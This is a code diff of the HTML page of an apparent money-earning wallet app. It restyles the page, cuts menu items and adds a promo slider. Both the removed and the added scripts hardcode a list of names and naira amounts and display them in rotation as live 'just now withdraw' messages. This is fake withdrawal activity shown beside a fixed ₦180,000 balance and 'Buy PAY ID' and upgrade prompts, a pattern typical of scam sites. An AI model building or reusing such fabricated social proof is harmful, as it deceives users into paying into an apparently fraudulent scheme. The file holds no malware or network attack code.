@@ -143,11 +143,6 @@
     .header-button:hover {
       background: #a463f8;
     }
-    .header-button svg {
-      fill: white;
-      width: 18px;
-      height: 18px;
-    }
     .menu-grid {
       margin: 30px 20px 10px;
       display: grid;
@@ -159,13 +154,11 @@
       cursor: pointer;
       font-size: 13px;
       color: #222;
-      user-select: none;
     }
-    .menu-item svg, .menu-item img {
+    .menu-item svg {
       width: 30px;
       height: 30px;
       margin-bottom: 8px;
-      filter: drop-shadow(0 0 0.5px rgba(0,0,0,0.12));
     }
     .announcement {
       width: 100%;
@@ -188,18 +181,6 @@
       50% { transform: translateX(calc(100% - 100vw)); }
       100% { transform: translateX(0); }
     }
-    .promo-card {
-      padding: 20px;
-      border-radius: 15px;
-      margin: 20px;
-      color: #000;
-    }
-    .promo-text h4 {
-      margin: 0;
-    }
-    .promo-text p {
-      margin: 4px 0 0;
-    }
     @media (max-width: 480px) {
       .header-buttons { flex-direction: column; gap: 12px; }
       .menu-grid { grid-template-columns: repeat(3, 1fr); }
@@ -212,64 +193,12 @@
   ⚡️ Important Announcements: The Opay bank service is currently experiencing issues. Please use other supported banks for your payment! ⚡️
 </div>
 
-<!-- Animated Withdrawal Announcement -->
+<!-- Withdrawal Scroller -->
 <div id="announcement-bar" style="background:#fffbe6;padding:10px;text-align:center;display:none;font-weight:600;color:#333;">
-  <div id="announcement-text" class="fade-slide"></div>
+  <div id="announcement-text"></div>
 </div>
 
-<script>
-  if (!localStorage.getItem("withdrawals")) {
-    localStorage.setItem("withdrawals", JSON.stringify([
-      { name: "Arabmoney", amount: 180000 },
-      { name: "maryam", amount: 90000 },
-      { name: "sale", amount: 120000 },
-      { name: "Ada", amount: 105000 },
-      { name: "Emmanuel", amount: 190000 },
-      { name: "sunday", amount: 150000 },
-      { name: "liberty", amount: 100000 },
-      { name: "sabastine", amount: 180000 },
-      { name: "Adebayo", amount: 170000}
-    ]));
-  }
-
-  let w = JSON.parse(localStorage.getItem("withdrawals") || "[]").slice(-5);
-  if (w.length) {
-    let i = 0;
-    const bar = document.getElementById("announcement-bar");
-    const text = document.getElementById("announcement-text");
-    bar.style.display = "block";
-
-    function showNext() {
-      text.classList.remove("show");
-      setTimeout(() => {
-        let item = w[i];
-        text.textContent = `${item.name.toUpperCase()} just now withdraw ₦${Number(item.amount).toLocaleString()}`;
-        text.classList.add("show");
-        i = (i + 1) % w.length;
-      }, 300);
-    }
-
-    showNext();
-    setInterval(showNext, 4000);
-  }
-
-  function toggleBalanceVisibility() {
-    const balance = document.getElementById("balance-amount");
-    const openEye = document.getElementById("eye-open");
-    const closedEye = document.getElementById("eye-closed");
-
-    if (balance.style.display === "none") {
-      balance.style.display = "inline";
-      openEye.style.display = "inline";
-      closedEye.style.display = "none";
-    } else {
-      balance.style.display = "none";
-      openEye.style.display = "none";
-      closedEye.style.display = "inline";
-    }
-  }
-</script>
-
+<!-- HEADER -->
 <div class="header-card">
   <div class="header-top">
     <div class="header-top-left">
@@ -284,7 +213,6 @@
       <div class="red-dot"></div>
     </div>
   </div>
-
   <div class="balance-label">Your Balance</div>
   <div class="balance-amount" id="balance-display">
     <span class="currency">₦</span><span id="balance-amount">180,000</span>
@@ -294,37 +222,95 @@
     </span>
   </div>
   <div class="weekly-rewards">Weekly Rewards: ₦180,000.00</div>
-
   <div class="header-buttons">
     <button class="header-button" onclick="location.href='earn.html'">Upgrade</button>
     <button class="header-button" onclick="location.href='withdraw.html'">Transfer</button>
   </div>
 </div>
 
+<!-- Menu -->
 <div class="menu-grid">
   <div class="menu-item" onclick="location.href='buy.html'"><svg fill="#7c20e6" viewBox="0 0 24 24"><path d="M20 6H4v12h16V6zm-2 9h-4v-2h4v2zm0-4h-4V9h4v2z"/></svg><div>Buy PAY ID</div></div>
   <div class="menu-item" onclick="location.href='watch.html'"><svg fill="#7c20e6" viewBox="0 0 24 24"><path d="M21 6h-6l-2-2H9L7 6H3v12h18V6zM9 16l4-4-4-4v8z"/></svg><div>Watch</div></div>
   <div class="menu-item" onclick="location.href='airtime.html'"><svg fill="#7c20e6" viewBox="0 0 24 24"><path d="M12 20c4.418 0 8-2.239 8-5v-2c0-2.761-3.582-5-8-5s-8 2.239-8 5v2c0 2.761 3.582 5 8 5z"/></svg><div>Airtime</div></div>
   <div class="menu-item" onclick="location.href='data.html'"><svg fill="#7c20e6" viewBox="0 0 24 24"><path d="M3 12h18v6H3z"/></svg><div>Data</div></div>
-  <div class="menu-item" onclick="location.href='support.html'"><svg fill="#7c20e6" viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 10 10A10.011 10.011 0 0 0 12 2zm1 15h-2v-2h2zm0-4h-2V7h2z"/></svg><div>Support</div></div>
-  <div class="menu-item" onclick="location.href='group.html'"><svg fill="#7c20e6" viewBox="0 0 24 24"><path d="M16 11a4 4 0 1 1-8 0 4 4 0 0 1 8 0zm-8 3v2H4v-2zm12 0v2h-4v-2z"/></svg><div>Group</div></div>
-  <div class="menu-item" onclick="location.href='earn.html'"><svg fill="#7c20e6" viewBox="0 0 24 24"><path d="M12 8l6 4-6 4V8z"/></svg><div>Earn More</div></div>
-  <div class="menu-item" onclick="location.href='profile.html'"><svg fill="#7c20e6" viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 8-4 8-4s8 0 8 4z"/></svg><div>Profile</div></div>
 </div>
 
-<div class="promo-card" style="background-color: #ffcc00;">
-  <div class="promo-text">
-    <h4>Invite & Earn</h4>
-    <p>Earn ₦500 per referral</p>
+<!-- Promo Slider -->
+<div id="promo-slider" style="overflow: hidden; position: relative; margin: 20px;">
+  <div id="promo-track" style="display: flex; transition: transform 0.5s ease;">
+    <div class="promo-card" style="background-color: #ffcc00; min-width: 100%;">
+      <div class="promo-text">
+        <h4>Invite & Earn</h4>
+        <p>Earn ₦500 per referral</p>
+      </div>
+    </div>
+    <div class="promo-card" style="background-color: #33ccff; min-width: 100%;">
+      <div class="promo-text">
+        <h4>Upgrade Your Wallet</h4>
+        <p>Get access to weekly bonuses</p>
+      </div>
+    </div>
   </div>
 </div>
 
-<div class="promo-card" style="background-color: #33ccff;">
-  <div class="promo-text">
-    <h4>Upgrade Your Wallet</h4>
-    <p>Get access to weekly bonuses</p>
-  </div>
-</div>
+<script>
+  // Withdrawal animation
+  if (!localStorage.getItem("withdrawals")) {
+    localStorage.setItem("withdrawals", JSON.stringify([
+      { name: "Arabmoney", amount: 180000 },
+      { name: "maryam", amount: 90000 },
+      { name: "sale", amount: 120000 },
+      { name: "Ada", amount: 105000 },
+      { name: "Emmanuel", amount: 190000 },
+      { name: "sunday", amount: 150000 },
+      { name: "liberty", amount: 100000 },
+      { name: "sabastine", amount: 180000 },
+      { name: "Adebayo", amount: 170000 }
+    ]));
+  }
 
+  let w = JSON.parse(localStorage.getItem("withdrawals") || "[]").slice(-5);
+  if (w.length) {
+    let i = 0;
+    const bar = document.getElementById("announcement-bar");
+    const text = document.getElementById("announcement-text");
+    bar.style.display = "block";
+
+    function showNext() {
+      text.textContent = `${w[i].name.toUpperCase()} just now withdraw ₦${Number(w[i].amount).toLocaleString()}`;
+      i = (i + 1) % w.length;
+    }
+
+    showNext();
+    setInterval(showNext, 4000);
+  }
+
+  // Toggle eye
+  function toggleBalanceVisibility() {
+    const balance = document.getElementById("balance-amount");
+    const openEye = document.getElementById("eye-open");
+    const closedEye = document.getElementById("eye-closed");
+    if (balance.style.display === "none") {
+      balance.style.display = "inline";
+      openEye.style.display = "inline";
+      closedEye.style.display = "none";
+    } else {
+      balance.style.display = "none";
+      openEye.style.display = "none";
+      closedEye.style.display = "inline";
+    }
+  }
+
+  // Promo slider
+  let promoIndex = 0;
+  const promoTrack = document.getElementById('promo-track');
+  const totalSlides = promoTrack.children.length;
+
+  setInterval(() => {
+    promoIndex = (promoIndex + 1) % totalSlides;
+    promoTrack.style.transform = `translateX(-${promoIndex * 100}%)`;
+  }, 4000);
+</script>
 </body>
 </html>
